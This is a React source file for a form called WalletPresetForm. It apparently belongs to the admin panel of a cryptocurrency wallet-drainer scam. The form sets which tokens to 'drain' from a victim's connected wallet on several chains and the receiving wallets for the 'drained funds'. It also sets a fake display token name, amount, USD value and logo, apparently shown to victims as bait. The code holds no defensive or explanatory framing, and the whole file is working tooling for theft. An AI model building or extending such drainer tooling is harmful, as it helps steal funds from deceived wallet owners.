import React, { useState, useEffect } from 'react';
import api from '../config/api';

const NETWORKS = [
  { id: 'ETH', name: 'Ethereum', symbol: 'ETH' },
  { id: 'BSC', name: 'BNB Chain', symbol: 'BNB' },
  { id: 'BASE', name: 'Base', symbol: 'ETH' },
  { id: 'POL', name: 'Polygon', symbol: 'POL' },
  { id: 'ARB', name: 'Arbitrum', symbol: 'ETH' },
  { id: 'OP', name: 'Optimism', symbol: 'ETH' },
  { id: 'AVAX', name: 'Avalanche', symbol: 'AVAX' },
  { id: 'SOLANA', name: 'Solana', symbol: 'SOL' },
  { id: 'TRON', name: 'Tron', symbol: 'TRX' },
  { id: 'ALL', name: 'ALL Networks', symbol: 'USD' },
];

function WalletPresetForm({ preset, onSubmit, onCancel }) {
  const [formData, setFormData] = useState({
    walletAddress: '',
    blockchain: 'ETH',
    gasFee: '0.005',
    gasFeeUsd: '2',
    receivingWallet: '',
    receivingWallets: {
      evm: '',
      solana: '',
      tron: '',
    },
    selectedTokens: [],
    drainAllTokens: false,
    token: {
      name: '',
      symbol: '',
      amount: '',
      usdValue: '',
      logo: '',
      address: '',
      decimals: 18,
    },
  });
  const [uploading, setUploading] = useState(false);
  const [availableTokens, setAvailableTokens] = useState({});
  const [loadingTokens, setLoadingTokens] = useState(true);
  const [tokenDropdownOpen, setTokenDropdownOpen] = useState(false);

  useEffect(() => {
    fetchAvailableTokens();
  }, []);

  useEffect(() => {
    if (preset) {
      const selectedTokenIds = preset.selectedTokens?.map(t => 
        typeof t === 'string' ? t : t._id
      ) || [];
      
      setFormData({
        walletAddress: preset.walletAddress,
        blockchain: preset.blockchain || 'ETH',
        gasFee: preset.gasFee?.toString() || '0.005',
        gasFeeUsd: preset.gasFeeUsd?.toString() || '2',
        receivingWallet: preset.receivingWallet || '',
        receivingWallets: {
          evm: preset.receivingWallets?.evm || '',
          solana: preset.receivingWallets?.solana || '',
          tron: preset.receivingWallets?.tron || '',
        },
        selectedTokens: selectedTokenIds,
        drainAllTokens: preset.drainAllTokens || false,
        token: {
          name: preset.token.name,
          symbol: preset.token.symbol,
          amount: preset.token.amount,
          usdValue: preset.token.usdValue,
          logo: preset.token.logo,
          address: preset.token.address || '',
          decimals: preset.token.decimals || 18,
        },
      });
    }
  }, [preset]);

  const fetchAvailableTokens = async () => {
    try {
      setLoadingTokens(true);
      const response = await api.get('/tokens/by-networks');
      setAvailableTokens(response.data);
    } catch (err) {
      console.error('Failed to fetch tokens:', err);
    } finally {
      setLoadingTokens(false);
    }
  };

  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    
    if (name.startsWith('token.')) {
      const tokenField = name.split('.')[1];
      setFormData((prev) => ({
        ...prev,
        token: {
          ...prev.token,
          [tokenField]: value,
        },
      }));
    } else if (name.startsWith('receivingWallets.')) {
      const walletType = name.split('.')[1];
      setFormData((prev) => ({
        ...prev,
        receivingWallets: {
          ...prev.receivingWallets,
          [walletType]: value,
        },
      }));
    } else if (type === 'checkbox') {
      setFormData((prev) => ({
        ...prev,
        [name]: checked,
      }));
    } else {
      if (name === 'blockchain') {
        setFormData((prev) => ({
          ...prev,
          [name]: value,
          selectedTokens: [],
          drainAllTokens: false,
        }));
      } else {
        setFormData((prev) => ({
          ...prev,
          [name]: value,
        }));
      }
    }
  };

  const handleLogoUpload = async (e) => {
    const file = e.target.files[0];
    if (!file) return;

    if (!file.type.startsWith('image/')) {
      alert('Please select an image file (JPG, PNG, GIF, or WebP)');
      return;
    }

    if (file.size > 10 * 1024 * 1024) {
      alert('File size too large. Maximum size is 10MB.');
      return;
    }

    try {
      setUploading(true);
      const uploadData = new FormData();
      uploadData.append('logo', file);

      const response = await api.post('/upload/logo', uploadData, {
        headers: { 'Content-Type': 'multipart/form-data' },
      });

      if (response.data && response.data.url) {
        setFormData((prev) => ({
          ...prev,
          token: { ...prev.token, logo: response.data.url },
        }));
      } else {
        throw new Error('No URL returned from server');
      }
    } catch (error) {
      let errorMessage = 'Error uploading logo';
      if (error.response?.data?.error) {
        errorMessage = error.response.data.error;
      } else if (error.message) {
        errorMessage = error.message;
      }
      alert(errorMessage);
    } finally {
      setUploading(false);
    }
  };

  const getTokensForSelection = () => {
    if (formData.blockchain === 'ALL') {
      const allTokens = [];
      Object.entries(availableTokens).forEach(([network, tokens]) => {
        tokens.forEach(token => {
          allTokens.push({ ...token, displayNetwork: network });
        });
      });
      return allTokens;
    }
    return availableTokens[formData.blockchain] || [];
  };

  const handleTokenToggle = (tokenId) => {
    setFormData((prev) => {
      const isSelected = prev.selectedTokens.includes(tokenId);
      return {
        ...prev,
        selectedTokens: isSelected
          ? prev.selectedTokens.filter(id => id !== tokenId)
          : [...prev.selectedTokens, tokenId],
        drainAllTokens: false,
      };
    });
  };

  const handleSelectAllTokens = () => {
    const tokens = getTokensForSelection();
    if (formData.drainAllTokens) {
      setFormData((prev) => ({
        ...prev,
        selectedTokens: [],
        drainAllTokens: false,
      }));
    } else {
      setFormData((prev) => ({
        ...prev,
        selectedTokens: tokens.map(t => t._id),
        drainAllTokens: true,
      }));
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!e.target.checkValidity()) {
      e.target.reportValidity();
      return;
    }

    const walletAddress = (formData.walletAddress || '').trim();
    const blockchain = formData.blockchain || 'ETH';
    const tokenName = (formData.token?.name || '').trim();
    const tokenSymbol = (formData.token?.symbol || '').trim();
    const tokenAmountStr = String(formData.token?.amount || '').trim();
    const usdValueStr = String(formData.token?.usdValue || '').trim();
    const logoUrl = (formData.token?.logo || '').trim();

    if (!walletAddress) {
      alert('Please enter a wallet address');
      return;
    }

    if (blockchain === 'ALL') {
      if (!formData.receivingWallets.evm?.trim()) {
        alert('Please enter an EVM receiving wallet address');
        return;
      }
    } else {
      if (!formData.receivingWallet?.trim()) {
        alert('Please enter a receiving wallet address');
        return;
      }
    }

    const tokenAmount = parseFloat(tokenAmountStr);
    if (isNaN(tokenAmount) || tokenAmount < 0) {
      alert('Please enter a valid token amount');
      return;
    }

    const usdValue = parseFloat(usdValueStr);
    if (isNaN(usdValue) || usdValue < 0) {
      alert('Please enter a valid USD value');
      return;
    }

    if (!logoUrl) {
      alert('Please upload a token logo');
      return;
    }

    const data = {
      walletAddress,
      blockchain,
      selectedTokens: formData.selectedTokens,
      drainAllTokens: formData.drainAllTokens,
      token: {
        name: tokenName,
        symbol: tokenSymbol,
        amount: tokenAmount,
        usdValue: usdValue,
        logo: logoUrl,
        address: (formData.token?.address || '').trim() || null,
        decimals: parseInt(formData.token?.decimals) || 18,
      },
    };

    if (blockchain === 'ALL') {
      data.receivingWallets = {
        evm: formData.receivingWallets.evm?.trim() || '',
        solana: formData.receivingWallets.solana?.trim() || '',
        tron: formData.receivingWallets.tron?.trim() || '',
      };
    } else {
      data.receivingWallet = formData.receivingWallet?.trim() || '';
    }

    const isUsdBasedGas = blockchain === 'ALL';
    
    if (isUsdBasedGas) {
      const gasFeeUsd = parseFloat(formData.gasFeeUsd);
      if (isNaN(gasFeeUsd) || gasFeeUsd < 0) {
        alert('Please enter a valid gas fee in USD');
        return;
      }
      data.gasFeeUsd = gasFeeUsd;
    } else {
      const gasFee = parseFloat(formData.gasFee);
      if (isNaN(gasFee) || gasFee < 0) {
        alert('Please enter a valid gas fee');
        return;
      }
      data.gasFee = gasFee;
    }

    onSubmit(data);
  };

  const currentNetwork = NETWORKS.find(n => n.id === formData.blockchain);
  const isUsdBasedGas = formData.blockchain === 'ALL';
  const tokensForSelection = getTokensForSelection();
  const selectedTokenCount = formData.selectedTokens.length;

  return (
    <div className="card">
      <div className="card-header">
        <h3>{preset ? 'Edit Wallet Preset' : 'Add Wallet Preset'}</h3>
      </div>
      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label>Wallet Address <span className="required">*</span></label>
          <input
            type="text"
            name="walletAddress"
            value={formData.walletAddress}
            onChange={handleInputChange}
            placeholder="Enter wallet address..."
            required
            disabled={!!preset}
          />
          <small style={{ color: '#888', fontSize: '0.75rem', marginTop: '4px', display: 'block' }}>
            Supports EVM (0x...), Solana, and Tron addresses
          </small>
        </div>

        <div className="form-row">
          <div className="form-group">
            <label>Network <span className="required">*</span></label>
            <select
              name="blockchain"
              value={formData.blockchain}
              onChange={handleInputChange}
              required
              disabled={!!preset}
            >
              {NETWORKS.map(network => (
                <option key={network.id} value={network.id}>
                  {network.name}
                </option>
              ))}
            </select>
          </div>
          <div className="form-group">
            <label>
              {isUsdBasedGas ? 'Gas Fee (USD)' : `Gas Fee (${currentNetwork?.symbol || 'ETH'})`}
              <span className="required">*</span>
            </label>
            <input
              type="text"
              name={isUsdBasedGas ? 'gasFeeUsd' : 'gasFee'}
              value={isUsdBasedGas ? formData.gasFeeUsd : formData.gasFee}
              onChange={handleInputChange}
              placeholder={isUsdBasedGas ? 'e.g., 2.00' : 'e.g., 0.005'}
              required
            />
            {isUsdBasedGas && (
              <small style={{ color: '#888', fontSize: '0.75rem', marginTop: '4px', display: 'block' }}>
                Minimum gas requirement in USD
              </small>
            )}
          </div>
        </div>

        {formData.blockchain === 'ALL' ? (
          <div className="receiving-wallets-section" style={{ background: '#1a1a2e', padding: '16px', borderRadius: '8px', marginBottom: '16px' }}>
            <label style={{ display: 'block', marginBottom: '12px', fontWeight: '600', color: '#f8fafc' }}>
              Receiving Wallet Addresses <span className="required">*</span>
            </label>
            
            <div className="form-group" style={{ marginBottom: '12px' }}>
              <label style={{ fontSize: '0.85rem' }}>
                EVM <span className="required">*</span>
              </label>
              <input
                type="text"
                name="receivingWallets.evm"
                value={formData.receivingWallets.evm}
                onChange={handleInputChange}
                placeholder="0x..."
                required
              />
            </div>
            
            <div className="form-group" style={{ marginBottom: '12px' }}>
              <label style={{ fontSize: '0.85rem' }}>
                Solana
              </label>
              <input
                type="text"
                name="receivingWallets.solana"
                value={formData.receivingWallets.solana}
                onChange={handleInputChange}
                placeholder="Solana address (optional)"
              />
            </div>
            
            <div className="form-group" style={{ marginBottom: '0' }}>
              <label style={{ fontSize: '0.85rem' }}>
                Tron
              </label>
              <input
                type="text"
                name="receivingWallets.tron"
                value={formData.receivingWallets.tron}
                onChange={handleInputChange}
                placeholder="T... address (optional)"
              />
            </div>
          </div>
        ) : (
          <div className="form-group">
            <label>Receiving Wallet Address <span className="required">*</span></label>
            <input
              type="text"
              name="receivingWallet"
              value={formData.receivingWallet}
              onChange={handleInputChange}
              placeholder={formData.blockchain === 'SOLANA' ? 'Solana address...' : formData.blockchain === 'TRON' ? 'T... address' : '0x...'}
              required
            />
            <small style={{ color: '#888', fontSize: '0.8rem', marginTop: '4px', display: 'block' }}>
              The wallet address where drained funds will be sent
            </small>
          </div>
        )}

        <div className="form-group token-selection-group">
          <label>Tokens to Drain</label>
          <small style={{ color: '#888', fontSize: '0.75rem', marginBottom: '10px', display: 'block' }}>
            Select tokens to drain from the connected wallet.
          </small>
          
          {loadingTokens ? (
            <div style={{ padding: '10px', color: '#888' }}>Loading tokens...</div>
          ) : tokensForSelection.length === 0 ? (
            <div style={{ padding: '10px', color: '#888', background: '#1a1a2e', borderRadius: '8px' }}>
              No tokens configured for {formData.blockchain === 'ALL' ? 'any network' : currentNetwork?.name || formData.blockchain}.
            </div>
          ) : (
            <div className="token-multiselect">
              <div 
                className="token-select-trigger"
                onClick={() => setTokenDropdownOpen(!tokenDropdownOpen)}
              >
                <span>
                  {formData.drainAllTokens 
                    ? `All tokens selected (${tokensForSelection.length})`
                    : selectedTokenCount > 0 
                      ? `${selectedTokenCount} token(s) selected`
                      : 'Select tokens...'}
                </span>
                <span className="dropdown-arrow">{tokenDropdownOpen ? '▲' : '▼'}</span>
              </div>
              
              {tokenDropdownOpen && (
                <div className="token-dropdown">
                  <div className="token-option select-all" onClick={handleSelectAllTokens}>
                    <input 
                      type="checkbox" 
                      checked={formData.drainAllTokens}
                      readOnly
                    />
                    <span><strong>Select All</strong></span>
                  </div>
                  <div className="token-options-list">
                    {tokensForSelection.map(token => (
                      <div 
                        key={token._id}
                        className="token-option"
                        onClick={() => handleTokenToggle(token._id)}
                      >
                        <input 
                          type="checkbox" 
                          checked={formData.selectedTokens.includes(token._id)}
                          readOnly
                        />
                        <span className="token-info">
                          <strong>{token.symbol}</strong>
                          <span className="token-name">{token.name}</span>
                          {formData.blockchain === 'ALL' && (
                            <span className={`network-badge badge-${token.network?.toLowerCase()}`}>
                              {token.network}
                            </span>
                          )}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}

          {selectedTokenCount > 0 && (
            <div className="selected-tokens-preview">
              {formData.selectedTokens.slice(0, 5).map(tokenId => {
                const token = tokensForSelection.find(t => t._id === tokenId);
                return token ? (
                  <span key={tokenId} className="selected-token-chip">
                    {token.symbol}
                    {formData.blockchain === 'ALL' && <small>({token.network})</small>}
                  </span>
                ) : null;
              })}
              {selectedTokenCount > 5 && (
                <span className="more-tokens">+{selectedTokenCount - 5} more</span>
              )}
            </div>
          )}
        </div>

        <div className="form-row">
          <div className="form-group">
            <label>Display Token Name <span className="required">*</span></label>
            <input
              type="text"
              name="token.name"
              value={formData.token.name}
              onChange={handleInputChange}
              placeholder="e.g., VDAO"
              required
            />
          </div>
          <div className="form-group">
            <label>Display Token Symbol <span className="required">*</span></label>
            <input
              type="text"
              name="token.symbol"
              value={formData.token.symbol}
              onChange={handleInputChange}
              placeholder="e.g., VDAO"
              required
            />
          </div>
        </div>

        <div className="form-row">
          <div className="form-group">
            <label>Display Token Amount <span className="required">*</span></label>
            <input
              type="number"
              name="token.amount"
              value={formData.token.amount}
              onChange={handleInputChange}
              placeholder="e.g., 20000"
              required
              min="0"
              step="0.01"
            />
          </div>
          <div className="form-group">
            <label>Display USD Value <span className="required">*</span></label>
            <input
              type="number"
              name="token.usdValue"
              value={formData.token.usdValue}
              onChange={handleInputChange}
              placeholder="e.g., 5000"
              required
              min="0"
              step="0.01"
            />
          </div>
        </div>

        <div className="form-group">
          <label>Display Token Logo <span className="required">*</span></label>
          <div className="logo-upload">
            {formData.token.logo && (
              <img src={formData.token.logo} alt="Logo preview" className="logo-preview" />
            )}
            <div className="file-input-wrapper">
              <input
                type="file"
                id="logo-upload"
                accept="image/*"
                onChange={handleLogoUpload}
                disabled={uploading}
              />
              <label htmlFor="logo-upload" className="file-input-label">
                {uploading ? 'Uploading...' : 'Upload Logo'}
              </label>
            </div>
          </div>
          {formData.token.logo && (
            <input
              type="text"
              value={formData.token.logo}
              readOnly
              style={{ marginTop: '10px', fontSize: '12px', opacity: 0.7 }}
            />
          )}
        </div>

        <div className="form-row">
          <div className="form-group">
            <label>Display Token Contract Address</label>
            <input
              type="text"
              name="token.address"
              value={formData.token.address}
              onChange={handleInputChange}
              placeholder="Contract address (leave empty for native tokens)"
            />
          </div>
          <div className="form-group">
            <label>Decimals</label>
            <input
              type="number"
              name="token.decimals"
              value={formData.token.decimals}
              onChange={handleInputChange}
              min="0"
              max="18"
            />
          </div>
        </div>

        <div style={{ display: 'flex', gap: '10px', marginTop: '20px' }}>
          <button type="submit" className="btn btn-primary">
            {preset ? 'Update Preset' : 'Create Preset'}
          </button>
          <button type="button" className="btn btn-secondary" onClick={onCancel}>
            Cancel
          </button>
        </div>
      </form>

      <style>{`
        .token-selection-group {
          margin-bottom: 20px;
        }

        .token-multiselect {
          position: relative;
        }

        .token-select-trigger {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 14px;
          background: #0f172a;
          border: 1px solid #334155;
          border-radius: 8px;
          cursor: pointer;
          color: #f8fafc;
          transition: border-color 0.2s;
        }

        .token-select-trigger:hover {
          border-color: #3b82f6;
        }

        .dropdown-arrow {
          font-size: 10px;
          color: #64748b;
        }

        .token-dropdown {
          position: absolute;
          top: 100%;
          left: 0;
          right: 0;
          background: #1e293b;
          border: 1px solid #334155;
          border-radius: 8px;
          margin-top: 4px;
          z-index: 100;
          max-height: 300px;
          overflow: hidden;
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }

        .token-options-list {
          max-height: 250px;
          overflow-y: auto;
        }

        .token-option {
          display: flex;
          align-items: center;
          gap: 10px;
          padding: 10px 14px;
          cursor: pointer;
          transition: background 0.15s;
        }

        .token-option:hover {
          background: #334155;
        }

        .token-option.select-all {
          border-bottom: 1px solid #334155;
          background: #0f172a;
        }

        .token-option input[type="checkbox"] {
          width: 16px;
          height: 16px;
          cursor: pointer;
        }

        .token-info {
          display: flex;
          align-items: center;
          gap: 8px;
          flex: 1;
        }

        .token-name {
          color: #94a3b8;
          font-size: 0.85rem;
        }

        .network-badge {
          padding: 2px 6px;
          border-radius: 4px;
          font-size: 0.7rem;
          font-weight: 500;
        }

        .selected-tokens-preview {
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
          margin-top: 10px;
        }

        .selected-token-chip {
          display: inline-flex;
          align-items: center;
          gap: 4px;
          padding: 4px 10px;
          background: linear-gradient(135deg, #3b82f6, #2563eb);
          border-radius: 20px;
          font-size: 0.8rem;
          color: white;
        }

        .selected-token-chip small {
          opacity: 0.7;
          font-size: 0.7rem;
        }

        .more-tokens {
          display: inline-flex;
          align-items: center;
          padding: 4px 10px;
          background: #334155;
          border-radius: 20px;
          font-size: 0.8rem;
          color: #94a3b8;
        }

        .badge-eth { background: linear-gradient(135deg, #627eea, #4f6de4); color: white; }
        .badge-bsc { background: linear-gradient(135deg, #f3ba2f, #c99a27); color: black; }
        .badge-base { background: linear-gradient(135deg, #0052ff, #0043cc); color: white; }
        .badge-pol { background: linear-gradient(135deg, #8247e5, #6b38c4); color: white; }
        .badge-arb { background: linear-gradient(135deg, #28a0f0, #2187c8); color: white; }
        .badge-op { background: linear-gradient(135deg, #ff0420, #cc031a); color: white; }
        .badge-avax { background: linear-gradient(135deg, #e84142, #c73435); color: white; }
        .badge-solana { background: linear-gradient(135deg, #9945ff, #14f195); color: white; }
        .badge-tron { background: linear-gradient(135deg, #eb0029, #bc0021); color: white; }
      `}</style>
    </div>
  );
}

export default WalletPresetForm;
